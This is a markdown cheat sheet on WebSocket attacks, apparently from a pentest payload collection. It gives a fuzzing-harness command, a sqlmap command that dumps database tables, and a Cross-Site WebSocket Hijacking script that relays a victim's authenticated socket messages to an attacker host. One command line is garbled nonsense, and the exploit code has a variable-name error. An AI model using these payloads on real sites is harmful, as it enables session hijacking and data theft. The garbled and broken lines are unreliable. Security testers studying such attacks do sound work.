# Web Sockets Attacks
> The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server
# Summary
* [Tools](#tools)
* [Using ws-harness.py](#using-ws-harness-py)
# Tools
* [ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)
# Using ws-harness.py
>>> Start ws-harness Listen on Web-socket & specify message template to send endpoint
<>
>>> ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
<>
>>> content of message**[FUZZ]**keyword.
<>
>>> {"auth_user":"dGVzda==", "auth_pass":"[FUZZ]"}
<>
>>> then, --vuln --xploit --inj --imp Proxy::BurpSuite ["USE","LIVE"]::[!]content::**msg**web-socket
>>> sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
<>
# Cross-Site WebSocket Hijacking (CSWSH)
>>> if WebSocket handshake is not correctly protected using a CSRF token or a
nonce, it's possible to use the authenticated WebSocket of a user on an
attacker's controlled site because cookies are automatically sent by the
browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).
<>
Example exploit, hosted on an attacker's server, that exfiltrates received
data from WebSocket to attacker:
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    websocket.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
You have to adjust code to your exact situation. E.g. if your web
application uses a `Sec-WebSocket-Protocol` header in handshake request,
you have to add this value as a 2nd parameter to `WebSocket` function call
in order to add this header.
# References
- [HACKING WEB SOCKETS: ALL WEB PENTEST TOOLS WELCOMED by Michael Fowl | Mar 5, 2019](https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
- [Hacking with WebSockets - Qualys - Mike Shema, Sergey Shekyan, Vaagn Toukharian](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
- [Mini WebSocket CTF - January 27, 2020 - Snowscan](https://snowscan.io/bbsctf-evilconneck/#)
